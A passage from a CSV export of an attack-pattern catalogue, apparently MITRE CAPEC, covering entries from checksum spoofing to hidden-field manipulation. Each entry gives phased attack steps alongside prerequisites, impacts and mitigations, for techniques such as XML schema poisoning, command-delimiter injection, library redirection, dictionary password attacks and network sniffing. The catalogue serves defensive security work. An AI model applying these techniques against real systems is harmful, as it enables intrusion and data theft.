value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:148::\",\"\",\"::The adversary must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.::The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.::The checksum value must be computable using information known to the adversary. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack.::\",\"\",\"::The adversary must have a utility that can intercept and modify messages between the sender and recipient.::\",\"\",\"\",\"\",\"\",\"::354::\",\"\",\"\",\n146,\"XML Schema Poisoning\",Detailed,Stable,\"An adversary corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:271::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine if XML schema is local or remote] Because this attack differs slightly if the target uses remote XML schemas versus local schemas, the adversary first needs to determine which of the two are used.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to XML schema] The adversary gains access to the XML schema so that they can modify the contents.:TECHNIQUE:For a local scenario, the adversary needs access to the machine that the schema is located on and needs to gain permissions to alter the contents of the file.:TECHNIQUE:For a remote scenario, the adversary needs to be able to sniff HTTP traffic that contains an XML schema.::STEP:3:PHASE:Exploit:DESCRIPTION:[Poison XML schema] Once the adversary gains access to the XML schema, they will alter it to achieve a desired effect. Locally, they can simply modify the file. For remote schemas, the adversary will alter the schema in transit by performing an adversary in the middle attack.:TECHNIQUE:Cause a denial of service by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the adversary removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data.:TECHNIQUE:Manipulation of the data types described in the schema may affect the results of calculations. For example, a float field could be changed to an int field.:TECHNIQUE:Change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might use a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).::\",\"::Some level of access to modify the target schema.::The schema used by the target application must be improperly secured against unauthorized modification and manipulation.::\",\"\",\"::Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Protect the schema against unauthorized modification.::Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the XML document. Additionally, ensure that the proper permissions are set on local files to avoid unauthorized modification.::Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.::\",\"::XML Schema Poisoning Attacks can often occur locally due to being embedded within the XML document itself or being located on the host within an improperaly protected file. In these cases, the adversary can simply edit the XML schema without the need for additional privileges. An example of the former can be seen below: <?xml version=1.0?> <!DOCTYPE contact [ <!ELEMENT contact (name,phone,email,address)> <!ELEMENT name (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT address (#PCDATA)> ]> <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.::XML Schema Poisoning Attacks can also be executed remotely if the HTTP protocol is being used to transport data. : <?xml version=1.0?> <!DOCTYPE contact SYSTEM http://example.com/contact.dtd[ <note> <name>John Smith</name> <phone>555-1234</phone> <email>jsmith@email.com</email> <address>1 Example Lane</address> </note></capec:Code> The HTTP protocol does not encrypt the traffic it transports, so all communication occurs in plaintext. This traffic can be observed and modified by the adversary during transit to alter the XML schema before it reaches the end user. The adversary can perform a Adversary-in-the-Middle (CAPEC-94) Attack to alter the schema in the same way as the previous example and to acheive the same results.::\",\"::15::472::\",\"\",\"\",\n147,\"XML Ping of the Death\",Detailed,Draft,\"An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:528::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a resource depletion attack] The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.:TECHNIQUE:Send a large number of crafted small XML messages to the target URL.::\",\"::The target must receive and process XML transactions.::\",\"::SKILL:To send small XML messages:LEVEL:Low::SKILL:To use distributed network to launch the attack:LEVEL:High::\",\"::Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:DoS: resource consumption (other)::\",\"::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::\",\"::Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.::\",\"::400::770::\",\"\",\"\",\n148,\"Content Spoofing\",Meta,Stable,\"An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.\",\"\",Medium,Medium,\"\",\"\",\"::The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which they are not authorized. If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.::\",\"\",\"::If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications. In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:A successful content spoofing attack compromises the integrity of the application data.::\",\"\",\"\",\"::345::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1491:ENTRY NAME:Defacement::::TAXONOMY NAME:WASC:ENTRY ID:12:ENTRY NAME:Content Spoofing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Content Spoofing::\",\"\",\n149,\"Explore for Predictable Temporary File Names\",Detailed,Draft,\"An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:497::NATURE:CanPrecede:CAPEC ID:155::\",\"\",\"::The targeted application must create names for temporary files using a predictable procedure, e.g. using sequentially increasing numbers.::The attacker must be able to see the names of the files the target is creating.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::377::\",\"\",\"\",\n15,\"Command Delimiters\",Standard,Draft,\"An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or denylist input validation, as opposed to allowlist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or denylist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:137::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.:TECHNIQUE:Port mapping using network connection-based software (e.g., nmap, nessus, etc.):TECHNIQUE:Port mapping by exploring the operating system (netstat, sockstat, etc.):TECHNIQUE:TCP/IP Fingerprinting:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt delimiters in inputs] The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.:TECHNIQUE:Inject command delimiters using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.):TECHNIQUE:Enter command delimiters directly in input fields.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use malicious command delimiters] The attacker uses combinations of payload and carefully placed command delimiters to attack the software.::\",\"::Software's input validation or filtering must not detect and block presence of additional malicious command.::\",\"::SKILL:The attacker has to identify injection vector, identify the specific commands, and optionally collect the output, i.e. from an interactive session.:LEVEL:Medium::\",\"::Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Design: Perform allowlist validation against a positive specification for command length, type, and parameters.::Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account::Implementation: Perform input validation for all remote content.::Implementation: Use type conversions such as JDBC prepared statements.::\",\"::By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.::\",\"::146::77::184::78::185::93::140::157::138::154::697::\",\"\",\"\",\n150,\"Collect Data from Common Resource Locations\",Standard,Draft,\"An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"::The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.::\",\"\",\"\",\"\",\"::An adversary can use a technique called Bluesnarfing to retrieve data from Bluetooth enabled devices in which they know where the data is located. This is done by connecting to the device’s Object Exchange (OBEX) Push Profile and making OBEX GET requests for known filenames (contact lists, photos, recent calls). Bluesnarfing was patched shortly after its discovery in 2003 and will only work on devices created before or during this time.::\",\"::552::1239::1258::1266::1272::1323::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1003:ENTRY NAME:OS Credential Dumping::::TAXONOMY NAME:ATTACK:ENTRY ID:1119:ENTRY NAME:Automated Collection::::TAXONOMY NAME:ATTACK:ENTRY ID:1213:ENTRY NAME:Data from Information Repositories::::TAXONOMY NAME:ATTACK:ENTRY ID:1530:ENTRY NAME:Data from Cloud Storage Object::::TAXONOMY NAME:ATTACK:ENTRY ID:1555:ENTRY NAME:Credentials from Password Stores::::TAXONOMY NAME:ATTACK:ENTRY ID:1602:ENTRY NAME:Data from Configuration Repository::\",\"\",\n151,\"Identity Spoofing\",Meta,Stable,\"Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.\",\"\",Medium,Medium,\"\",\"\",\"::The identity associated with the message or resource must be removable or modifiable in an undetectable way.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Authentication:SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::\",\"::Employ robust authentication processes (e.g., multi-factor authentication).::\",\"\",\"::287::\",\"\",\"\",\n153,\"Input Data Manipulation\",Meta,Draft,\"An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target.\",\"\",,Medium,\"\",\"\",\"::The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::20::\",\"\",\"\",\n154,\"Resource Location Spoofing\",Meta,Stable,\"An adversary deceives an application or user and convinces them to request a resource from an unintended location. By spoofing the location, the adversary can cause an alternate resource to be used, often one that the adversary controls and can be used to help them achieve their malicious goals.\",\"\",Medium,Medium,\"\",\"\",\"::None. All applications rely on file paths and therefore, in theory, they or their resources could be affected by this type of attack.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Monitor network activity to detect any anomalous or unauthorized communication exchanges.::\",\"\",\"::451::\",\"\",\"\",\n155,\"Screen Temporary Files for Sensitive Information\",Detailed,Draft,\"An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Look for temporary files in target application] An adversary will try to discover temporary files in a target application. Knowledge of where the temporary files are being stored is important information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to read temporary files] An adversary will attempt to read any temporary files they may have discovered through normal means.:TECHNIQUE:Attempt to get the file by querying the file path to a web server:TECHNIQUE:Using a remote shell into an application, read temporary files and send out information remotely if necessary:TECHNIQUE:Recover temporary information from a user's browser cache::STEP:3:PHASE:Exploit:DESCRIPTION:[Use function weaknesses to gain access to temporary files] If normal means to read temporary files did not work, an adversary will attempt to exploit weak temporary file functions to gain access to temporary files.:TECHNIQUE:Some C functions such as tmpnam(), tempnam(), and mktemp() will create a temporary file with a unique name, but do not stop an adversary from creating a file of the same name before it is opened by the application. Because these functions do not create file names that are sufficiently random, an adversary will try to make a file of the same name, causing a collision, and possibly altering file permissions for the temporary file so that it is able to be read.:TECHNIQUE:Similar to the last technique, an adversary might also create a file name collision using a linked file in a unix system such that the temporary file contents written out by the application write to a file of the adversaries choosing, allowing them to read the file contents.::\",\"::The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.::\",\"\",\"::Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.::\",\"\",\"\",\"\",\"\",\"::377::\",\"\",\"\",\n157,\"Sniffing Attacks\",Standard,Draft,\"In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient. Sniffing Attacks are similar to Adversary-In-The-Middle attacks (CAPEC-94), but are entirely passive. AiTM attacks are predominantly active and often alter the content of the communications themselves.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:117::NATURE:CanPrecede:CAPEC ID:652::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Communication Mechanism] The adversary determines the nature and mechanism of communication between two components, looking for opportunities to exploit.:TECHNIQUE:Look for application documentation that might describe a communication mechanism used by a target.::STEP:2:PHASE:Experiment:DESCRIPTION:[Position In Between Targets] The adversary positions themselves somewhere in the middle of the two components. If the communication is encrypted, the adversary will need to act as a proxy and route traffic between the components, exploiting a flaw in the encryption mechanism. Otherwise, the adversary can just observe the communication at either end.:TECHNIQUE:Use Wireshark or some other packet capturing tool to capture traffic on a network.:TECHNIQUE:Install spyware on a client that will intercept outgoing packets and route them to their destination as well as route incoming packets back to the client.:TECHNIQUE:Exploit a weakness in an encrypted communication mechanism to gain access to traffic. Look for outdated mechanisms such as SSL.::STEP:3:PHASE:Exploit:DESCRIPTION:[Listen to Communication] The adversary observes communication, but does not alter or block it. The adversary gains access to sensitive information and can potentially utilize this information in a malicious way.::\",\"::The target data stream must be transmitted on a medium to which the adversary has access.::\",\"\",\"::The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Encrypt sensitive information when transmitted on insecure mediums to prevent interception.::\",\"\",\"::311::\",\"\",\"\",\n158,\"Sniffing Network Traffic\",Detailed,Draft,\"In this attack pattern, the adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information at the protocol level. Network sniffing applications can reveal TCP/IP, DNS, Ethernet, and other low-level network communication information. The adversary takes a passive role in this attack pattern and simply observes and analyzes the traffic. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the target information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:157::\",\"\",\"::The target must be communicating on a network protocol visible by a network sniffing application.::The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication.::\",\"::SKILL:Adversaries can obtain and set up open-source network sniffing tools easily.:LEVEL:Low::\",\"::A tool with the capability of presenting network communication traffic (e.g., Wireshark, tcpdump, Cain and Abel, etc.).::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Obfuscate network traffic through encryption to prevent its readability by network sniffers.::Employ appropriate levels of segmentation to your network in accordance with best practices.::\",\"\",\"::311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::::TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n159,\"Redirect Access to Libraries\",Standard,Stable,\"An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:154::NATURE:CanPrecede:CAPEC ID:185::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] The adversary identifies the target application and determines what libraries are being used.:TECHNIQUE:Find public source code and identify library dependencies.:TECHNIQUE:Gain access to the system hosting the application and look for libraries in common locations.::STEP:2:PHASE:Experiment:DESCRIPTION:[Deploy Malicious Libraries] The adversary crafts malicious libraries and deploys them on the system where the application is running, or in a remote location that can be loaded by the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect Library Calls to Malicious Library] Once the malicious library crafted by the adversary is deployed, the adversary will manipulate the flow of the application such that it calls the malicious library. This can be done in a variety of ways based on how the application is loading and calling libraries.:TECHNIQUE:Poison the DNS cache of the system so that it loads a malicious library from a remote location hosted by the adversary instead of the legitimate location:TECHNIQUE:Create a symlink that tricks the application into thinking that a malicious library is the legitimate library.:TECHNIQUE:Use DLL side-loading to place a malicious verison of a DLL in the windows directory.::\",\"::The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.::\",\"::SKILL:To modify the entries in the configuration file pointing to malicious libraries:LEVEL:Low::SKILL:To force symlink and timing issues for redirecting access to libraries:LEVEL:Medium::SKILL:To reverse engineering the libraries and inject malicious code into the libraries:LEVEL:High::\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Restrict the permission to modify the entries in the configuration file.::Implementation: Check the integrity of the dynamically linked libraries before use them.::Implementation: Use obfuscation and other techniques to prevent reverse engineering the libraries.::\",\"::In this example, the attacker using ELF infection that redirects the Procedure Linkage Table (PLT) of an executable allowing redirection to be resident outside of the infected executable. The algorithm at the entry point code is as follows... • mark the text segment writeable • save the PLT(GOT) entry • replace the PLT(GOT) entry with the address of the new lib call The algorithm in the new library call is as follows... • do the payload of the new lib call • restore the original PLT(GOT) entry • call the lib call • save the PLT(GOT) entry again (if its changed) • replace the PLT(GOT) entry with the address of the new lib call::\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.008:ENTRY NAME:Hijack Execution Flow:Path Interception by Search Order Hijacking::\",\"\",\n16,\"Dictionary-based Password Attack\",Detailed,Draft,\"An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern. Dictionary Attacks differ from similar attacks such as Password Spraying (CAPEC-565) and Credential Stuffing (CAPEC-600), since they leverage unknown username/password combinations and don't care about inducing account lockouts.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Select dictionaries] Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.):TECHNIQUE:Select dictionary based on particular users' preferred languages.:TECHNIQUE:Select dictionary based on the application/system's supported languages.::STEP:3:PHASE:Explore:DESCRIPTION:[Determine username(s) to target] Determine username(s) whose passwords to crack.:TECHNIQUE:Obtain username(s) by sniffing network packets.:TECHNIQUE:Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not):TECHNIQUE:Obtain usernames from filesystem (e.g. list of directories in C:Documents and Settings in Windows, and list in /etc/passwd in UNIX-like systems)::STEP:4:PHASE:Exploit:DESCRIPTION:[Use dictionary to crack passwords.] Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.:TECHNIQUE:Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).:TECHNIQUE:Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).::\",\"::The system uses one factor password based authentication.::The system does not have a sound password policy that is being enforced.::The system does not implement an effective password throttling mechanism.::\",\"::SKILL:A variety of password cracking tools and dictionaries are available to launch this type of an attack.:LEVEL:Low::\",\"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.::\",\"::Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Leverage multi-factor authentication for all authentication services.::\",\"::A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.::The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096::\",\"::521::262::263::654::307::308::309::\",\"\",\"\",\n160,\"Exploit Script-Based APIs\",Standard,Draft,\"Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:113::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify API] Discover an API of interest by exploring application documentation or observing responses to API calls:TECHNIQUE:Search via internet for known, published APIs that support scripting instructions as arguments::STEP:2:PHASE:Experiment:DESCRIPTION:[Test simple script] Adversaries will attempt to give a smaller script as input to the API, such as simply printing to the console, to see if the attack is viable.:TECHNIQUE:Create a general script to be taken as input by the API::STEP:3:PHASE:Exploit:DESCRIPTION:[Give malicious scripting instructions to API] Adversaries will now craft custom scripts to do malicious behavior. Depending on the setup of the application this script could be run with user or admin level priveleges.:TECHNIQUE:Crafting a malicious script to be run on a system based on priveleges and capabilities of the system::\",\"::The target application must include the use of APIs that execute scripts.::The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::346::\",\"\",\"\",\n161,\"Infrastructure Manipulation\",Meta,Draft,\"An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.\",\"\",,High,\"::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are, in fact, connected to the site they intended.)::\",\"\",\"::The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.::\",\"\",\"\",\"\",\"\",\"::923::\",\"\",\"\",\n162,\"Manipulating Hidden Fields\",Detailed,Draft,\"An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the 